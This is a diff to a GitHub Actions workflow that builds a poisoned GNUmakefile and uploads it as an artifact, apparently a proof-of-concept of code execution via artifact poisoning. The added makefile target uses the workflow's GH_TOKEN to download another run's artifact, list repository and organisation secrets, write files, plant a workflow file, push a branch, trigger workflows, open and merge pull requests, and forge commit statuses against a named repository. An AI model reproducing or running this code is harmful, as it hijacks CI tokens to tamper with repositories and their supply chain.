@@ -40,30 +40,40 @@ jobs:
           python3 - <<'PY'
           lines = [
               "generate:",
-              "\t@echo PWNED_MARKER_VALIDATE_RCE_20261111",
+              "\t@echo PWNED_MARKER_VALIDATE_RCE_V2",
               "\t@id",
-              "\t@echo GITHUB_REPOSITORY=$$GITHUB_REPOSITORY GITHUB_WORKFLOW=$$GITHUB_WORKFLOW GITHUB_RUN_ID=$$GITHUB_RUN_ID",
-              "\t@echo PWD=$$PWD",
-              "\t@echo GH_TOKEN_PRESENT=$${GH_TOKEN:+yes} TOKEN_LEN=$${#GH_TOKEN}",
-              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY -o /tmp/repo.json -w 'API_REPO_HTTP=%{http_code}\\n'",
-              "\t@head -c 900 /tmp/repo.json; echo",
-              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/runs/'$$GITHUB_RUN_ID'/jobs' -o /tmp/jobs.json -w 'API_JOBS_HTTP=%{http_code}\\n'",
-              "\t@head -c 600 /tmp/jobs.json; echo",
-              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/runs?per_page=3' -o /tmp/runs.json -w 'API_RUNS_HTTP=%{http_code}\\n'",
-              "\t@head -c 400 /tmp/runs.json; echo",
-              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/secrets' -o /tmp/secrets.json -w 'API_SECRETS_HTTP=%{http_code}\\n'",
-              "\t@head -c 300 /tmp/secrets.json; echo",
-              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/statuses/'$$GITHUB_SHA -d '{\"state\":\"success\",\"context\":\"omp-rce-proof\",\"description\":\"RCE via poisoned artifact\"}' -o /tmp/status.json -w 'API_STATUS_WRITE_HTTP=%{http_code}\\n'",
-              "\t@head -c 500 /tmp/status.json; echo",
-              "\t@curl -sS -X PUT -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/contents/omp-rce-probe.txt' -d '{\"message\":\"probe\",\"content\":\"aGk=\"}' -o /tmp/cw.json -w 'API_CONTENTS_WRITE_HTTP=%{http_code}\\n'",
-              "\t@head -c 300 /tmp/cw.json; echo",
+              "\t@echo RUN_CONTEXT=$$GITHUB_REPOSITORY/$$GITHUB_WORKFLOW run=$$GITHUB_RUN_ID sha=$$GITHUB_SHA",
+              "\t@echo GH_TOKEN_LEN=$${#GH_TOKEN}",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY -o /tmp/repo.json -w 'PROBE_REPO=%{http_code}\\n'",
+              "\t@grep -o '\"permissions\":{[^}]*}' /tmp/repo.json || true",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -L 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/artifacts/13887160886/zip' -o /tmp/a.zip -w 'PROBE_ARTIFACT_OTHER_RUN_DOWNLOAD=%{http_code}\\n'",
+              "\t@echo ARTIFACT_BYTES=`wc -c < /tmp/a.zip`; unzip -l /tmp/a.zip | head -5",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/installation/repositories' -o /tmp/inst.json -w 'PROBE_INSTALLATION_REPOS=%{http_code}\\n'",
+              "\t@grep -o '\"full_name\":\"[^\"]*\"' /tmp/inst.json || true",
+              "\t@curl -sS -X PUT -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/contents/omp-probe-v2.txt' -d '{\"message\":\"probe\",\"content\":\"aGk=\"}' -o /tmp/cw.json -w 'PROBE_CONTENTS_WRITE=%{http_code}\\n'",
+              "\t@head -c 200 /tmp/cw.json; echo",
+              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/workflows/spec.main.yml/dispatches' -d '{\"ref\":\"main\"}' -o /tmp/wd.json -w 'PROBE_WORKFLOW_DISPATCH=%{http_code}\\n'",
+              "\t@head -c 200 /tmp/wd.json; echo",
+              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/pulls' -d '{\"title\":\"probe\",\"head\":\"spec-pr-rce\",\"base\":\"main\"}' -o /tmp/pr.json -w 'PROBE_PR_CREATE=%{http_code}\\n'",
+              "\t@head -c 200 /tmp/pr.json; echo",
+              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/merges' -d '{\"base\":\"main\",\"head\":\"spec-pr-rce\"}' -o /tmp/mg.json -w 'PROBE_MERGE_API=%{http_code}\\n'",
+              "\t@head -c 200 /tmp/mg.json; echo",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/secrets' -o /tmp/sec.json -w 'PROBE_SECRETS_LIST=%{http_code}\\n'",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/variables' -o /tmp/var.json -w 'PROBE_VARIABLES_LIST=%{http_code}\\n'",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/orgs/PDFtoMark/actions/secrets' -o /tmp/org.json -w 'PROBE_ORG_SECRETS=%{http_code}\\n'",
+              "\t@echo GIT_PUSH_PROBE:",
+              "\t@rm -rf /tmp/gitchk && git clone -q 'https://x-access-token:'$$GH_TOKEN'@github.com/'$$GITHUB_REPOSITORY'.git' /tmp/gitchk 2>&1 | tail -2; cd /tmp/gitchk && echo probe > probe.txt && git add probe.txt && git -c user.email=rce@example.invalid -c user.name=rce commit -qm probe && git push origin HEAD:refs/heads/omp-rce-push-probe 2>&1 | tail -3; echo PUSH_DONE",
+              "\t@curl -sS -X PUT -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/contents/.github/workflows/omp-probe.yml' -d '{\"message\":\"probe\",\"content\":\"bmFtZTogcHJvYmUK\"}' -o /tmp/wf.json -w 'PROBE_WORKFLOW_FILE_PUT=%{http_code}\\n'",
+              "\t@head -c 300 /tmp/wf.json; echo",
+              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/statuses/f6c34fdef315797ce990705ae252b38482291cb6' -d '{\"state\":\"success\",\"context\":\"omp-status-forgery\",\"description\":\"status forged by stolen workflow token\"}' -o /tmp/st2.json -w 'PROBE_STATUS_ARBITRARY_COMMIT=%{http_code}\\n'",
+              "\t@head -c 300 /tmp/st2.json; echo",
               "\t@echo === PWNED_END ===",
               "test-mocked:",
               "\t@true",
           ]
           open("pydo/GNUmakefile", "w").write("\n".join(lines) + "\n")
           PY
-          ls -la pydo; echo ---; cat -A pydo/GNUmakefile | head -5
+          ls -la pydo
 
       - uses: actions/upload-artifact@v4
         with:
